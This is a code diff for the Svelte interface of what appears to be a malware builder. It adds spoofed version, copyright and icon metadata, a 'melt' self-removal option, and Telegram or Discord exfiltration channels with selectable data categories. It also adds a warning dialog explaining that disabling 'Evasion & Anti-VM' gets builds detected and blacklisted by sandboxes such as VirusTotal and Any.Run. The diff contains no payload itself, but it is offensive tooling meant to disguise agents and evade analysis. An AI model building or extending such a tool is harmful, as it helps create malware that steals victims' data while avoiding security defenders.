+            <Label class="text-xs text-muted-foreground" for="product-version">
+              Product version
+            </Label>
+            <Input
+              id="product-version"
+              placeholder="1.0.0.0"
+              bind:value={builderState.productVersion}
+            />
+          </div>
+          <div class="space-y-2">
+            <Label class="text-xs text-muted-foreground" for="file-version">
+              File version
+            </Label>
+            <Input
+              id="file-version"
+              placeholder="1.0.0.0"
+              bind:value={builderState.fileVersion}
+            />
+          </div>
+          <div class="space-y-2">
+            <Label class="text-xs text-muted-foreground" for="copyright">
+              Copyright
+            </Label>
+            <Input
+              id="copyright"
+              placeholder="© 2026 Example Co."
+              bind:value={builderState.copyright}
+            />
           </div>
         </div>
-      </div>
-    </div>
+        <div
+          class="grid w-full items-start gap-3 md:grid-cols-[minmax(180px,0.35fr)_minmax(0,1fr)]"
+        >
+          <div class="space-y-2">
+            <Label class="text-xs text-muted-foreground" for="icon-preset">
+              Preset icon
+            </Label>
+            <Select
+              type="single"
+              bind:value={builderState.iconPreset}
+              disabled={builderState.iconSource.trim().length > 0}
+            >
+              <SelectTrigger id="icon-preset" class="w-full">
+                <span>{getIconPresetLabel(builderState.iconPreset)}</span>
+              </SelectTrigger>
+              <SelectContent>
+                {#each iconPresets as preset (preset.id)}
+                  <SelectItem value={preset.id}>{preset.label}</SelectItem>
+                {/each}
+              </SelectContent>
+            </Select>
+          </div>
+          <div class="space-y-2">
+            <Label class="text-xs text-muted-foreground">Custom icon</Label>
+            <div class="grid gap-3 md:grid-cols-[1fr_auto]">
+              <Input
+                placeholder="Icon URL, file path, or directory"
+                bind:value={builderState.iconSource}
+                disabled={builderState.iconPreset !== "none"}
+              />
+              <Button
+                variant="outline"
+                onclick={chooseIconFile}
+                disabled={builderState.iconPreset !== "none"}
+              >
+                Choose icon
+              </Button>
+            </div>
+          </div>
+        </div>
+      </Collapsible.Content>
+    </Collapsible.Root>
 
     <Separator />
 
     <div class="flex items-center space-x-2">
-        <Switch
-            id="fast-build"
-            checked={fastBuild}
-            onCheckedChange={toggleFastBuild}
-        />
-        <Label for="fast-build" class="flex items-center gap-2">
-            <Zap class="h-4 w-4 text-amber-500" />
-            Fast Build
-            <span class="text-xs text-muted-foreground font-normal">
-                (Skip compilation, reuse existing binary. Branding changes will be ignored.)
-            </span>
-        </Label>
+      <Switch
+        id="standalone-build"
+        checked={builderState.standalone}
+        onCheckedChange={toggleStandalone}
+      />
+      <Label for="standalone-build" class="flex items-center gap-2">
+        <Zap class="h-4 w-4 text-amber-500" />
+        Standalone Build
+        <span class="text-xs text-muted-foreground font-normal">
+          (Removes dependency on vcruntime140.dll by statically linking the C
+          runtime. Increases exe size.)
+        </span>
+      </Label>
     </div>
 
-    <div class="sticky bottom-4 z-40 -mx-4 rounded-lg border border-border/70 bg-background/95 px-4 py-4 shadow-lg backdrop-blur">
+    <div class="flex items-center space-x-2">
+      <Switch
+        id="debug-mode"
+        checked={builderState.debug}
+        onCheckedChange={() => (builderState.debug = !builderState.debug)}
+      />
+      <Label for="debug-mode" class="flex items-center gap-2">
+        <Hammer class="h-4 w-4 text-blue-500" />
+        Debug Mode
+        <span class="text-xs text-muted-foreground font-normal">
+          (Keeps terminal open, creates desktop log, and disables melt feature.)
+        </span>
+      </Label>
+    </div>
+
+    <div
+      class="sticky bottom-4 z-40 -mx-4 rounded-lg border border-border/70 bg-background/95 px-4 py-4 shadow-lg backdrop-blur"
+    >
       <div class="flex flex-wrap items-center justify-between gap-4">
         <Button
           size="lg"
-          class={`gap-2 transition-colors ${buildStatus === "success" ? "bg-emerald-500 text-white hover:bg-emerald-500" : ""}`}
+          class={`gap-2 transition-colors ${builderState.buildStatus === "success" ? "bg-emerald-500 text-white hover:bg-emerald-500" : ""}`}
           onclick={runBuild}
-          disabled={buildStatus === "loading" || !canBuild}
+          disabled={builderState.buildStatus === "loading" || !canBuild}
         >
           <Hammer class="h-4 w-4" />
-          {buildStatus === "loading"
+          {builderState.buildStatus === "loading"
             ? "Building..."
-            : buildStatus === "success"
+            : builderState.buildStatus === "success"
               ? "Success"
               : "Build release"}
         </Button>
         <div class="text-xs text-muted-foreground">
           <div class="flex items-center gap-2">
-            <span class={hasCommunication ? "text-emerald-500" : "text-destructive"}>
-              {hasCommunication ? "Communication set" : "Select Telegram or Discord"}
+            <span
+              class={hasCommunication ? "text-emerald-500" : "text-destructive"}
+            >
+              {hasCommunication
+                ? "Communication set"
+                : "Select Telegram or Discord"}
             </span>
             <span class="text-muted-foreground">•</span>
-            <span class={selectedCategoryCount > 0 ? "text-emerald-500" : "text-destructive"}>
-              {selectedCategoryCount > 0 ? `${selectedCategoryCount} categories` : "Pick a category"}
+            <span
+              class={builderState.selectedCategoryCount > 0
+                ? "text-emerald-500"
+                : "text-destructive"}
+            >
+              {builderState.selectedCategoryCount > 0
+                ? `${builderState.selectedCategoryCount} categories`
+                : "Pick a category"}
             </span>
           </div>
         </div>
         <div class="grid gap-3 md:grid-cols-[1fr_auto]">
-          <Input
-            placeholder="Defaults to Desktop"
-            bind:value={outputDir}
-          />
+          <Input placeholder="Defaults to Desktop" bind:value={builderState.outputDir} />
           <Button variant="outline" onclick={chooseOutputDir}>
             Choose folder
           </Button>
@@ -738,3 +819,38 @@
     </div>
   </CardContent>
 </main>
+
+<Dialog bind:open={builderState.showEvasionWarning}>
+  <DialogContent>
+    <DialogHeader>
+      <DialogTitle>Warning: Disabling Evasion</DialogTitle>
+      <DialogDescription class="space-y-4">
+        <p>
+          Disabling <strong>Evasion & Anti-VM</strong> will significantly
+          increase detection rates on analysis platforms like
+          <strong>VirusTotal, Any.Run, Triage, Joe Sandbox</strong>, etc.
+        </p>
+        <p>
+          Analysis environments will be able to easily identify the agent's
+          behavior, leading to faster blacklisting of your build.
+        </p>
+        <p class="text-xs text-muted-foreground">
+          Only disable this if you intend to run the agent in your own
+          controlled virtual environment for debugging or testing.
+        </p>
+      </DialogDescription>
+    </DialogHeader>
+    <DialogFooter class="flex justify-end gap-3 mt-4">
+      <Button variant="outline" onclick={() => (builderState.showEvasionWarning = false)}
+        >Cancel</Button
+      >
+      <Button
+        variant="destructive"
+        onclick={() => {
+          builderState.evasion = false;
+          builderState.showEvasionWarning = false;
+        }}>Disable anyway</Button
+      >
+    </DialogFooter>
+  </DialogContent>
+</Dialog>
